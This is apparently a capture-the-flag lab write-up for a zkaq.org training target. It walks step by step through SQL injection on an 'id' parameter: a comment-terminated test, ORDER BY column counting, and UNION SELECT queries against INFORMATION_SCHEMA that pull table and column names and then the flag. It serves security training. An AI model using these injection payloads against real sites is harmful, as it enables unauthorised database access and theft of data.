# Lab 6.1.2 SQL Error-Based Injection

## 0x00 Basic Knowledge

This is a follow up lab of [Lab 6.1.1](../lab6.1.1_sql_error_based_injection).

## 0x01 Go Hack It

Lab site from [zkaq.org][1]

### [Home Page][2]

![](./imgs/0_home.jpg)

### Injection Point

```sql
id=1%23
```

![](./imgs/1_point.jpg)

```sql
id=1 AND 1=2%23
```

![](./imgs/1_err.jpg)

### Field Number

Wroks with ORDER BY 3 but not 4. So need 3 fields for UNION SELECT.

```sql
id=1 AND 1=1 ORDER BY 1,2,3%23
```

![](./imgs/2_order.jpg)

### Version

MySQL version = 5.5.53

```sql
id=1 AND 1=2 UNION SELECT 1,2,VERSION()%23
```

![](./imgs/3_ver.jpg)

### TABLE_NAME

```sql
id=1 AND 1=2 UNION SELECT 1,2,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE() LIMIT 4,1%23
```

| OFFSET | TABLE_NAME   |
| ------ | ------------ |
| 0      | emails       |
| 1      | referers     |
| 2      | uagents      |
| 3      | users        |
| 4      | zkaq         |

The useful table should be **zkaq**

![](./imgs/4_table_name.jpg)

### COLUMN_NAME

```sql
id=1 AND 1=2 UNION SELECT 1,2,COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='zkaq' LIMIT 1,1%23
```

| OFFSET | COLUMN_NAME  |
| ------ | ------------ |
| 0      | flag         |
| 1      | zKaQ         |

![](./imgs/5_column_name.jpg)

### FLAG

```sql
id=1 AND 1=2 UNION SELECT 1,flag,zKaQ FROM zkaq WHERE flag=2%23
```

![](./imgs/6_flag.jpg)

**FLAG** = **zKaQ-ErrOrSqLInJ4ct1ons**

[1]: https://hack.zkaq.org/?a=battle&f=target&id=da57029e3807f2c1
[2]: http://120.203.13.75:8150/New/ErrorBased/RankTwo/sql-two/
